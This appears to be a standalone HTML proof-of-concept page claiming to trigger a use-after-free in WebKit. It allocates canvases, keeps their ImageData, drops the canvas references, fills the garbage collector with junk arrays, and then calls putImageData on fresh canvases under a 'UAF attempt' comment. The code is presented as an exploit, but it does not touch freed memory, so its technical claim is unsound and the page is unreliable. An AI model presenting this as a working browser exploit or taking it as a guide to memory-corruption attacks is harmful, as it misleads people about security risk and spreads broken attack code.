<!DOCTYPE html>
<html>
<head>
  <title>PoC WebKit UAF Visual</title>
  <style>
    body { background: black; color: lime; font-family: monospace; }
    #log { white-space: pre-wrap; }
  </style>
</head>
<body>
  <h1>UAF Test Running...</h1>
  <div id="log"></div>

  <script>
    const log = document.getElementById("log");
    function print(msg) {
      log.textContent += msg + "\n";
    }

    let canvases = [], data = [];

    function allocAll() {
      for (let i = 0; i < 50; i++) {
        let c = document.createElement("canvas");
        c.width = 128;
        c.height = 128;
        let ctx = c.getContext("2d");
        ctx.fillStyle = "red";
        ctx.fillRect(0, 0, 128, 128);
        canvases.push(c);
        data.push(ctx.getImageData(0, 0, 128, 128));
      }
      print("[+] Allocated canvases and captured imageData");
    }

    function gcFill() {
      for (let i = 0; i < 2000; i++) {
        let junk = new Array(1000).fill(i);
      }
      print("[+] GC filled with junk arrays");
    }

    function freeAndCrash() {
      canvases = []; // free references
      gcFill();
      print("[+] Attempting putImageData on freed contexts...");

      try {
        for (let i = 0; i < 50; i++) {
          let canvas = document.createElement("canvas");
          canvas.width = 128;
          canvas.height = 128;
          let ctx = canvas.getContext("2d");
          ctx.putImageData(data[i], 0, 0); // UAF attempt
        }
      } catch (e) {
        print("[-] Exception: " + e.message);
      }

      print("[+] Done with attempt.\n");
    }

    setTimeout(() => {
      allocAll();
      setTimeout(freeAndCrash, 1000);
    }, 100);
  </script>
</body>
</html>
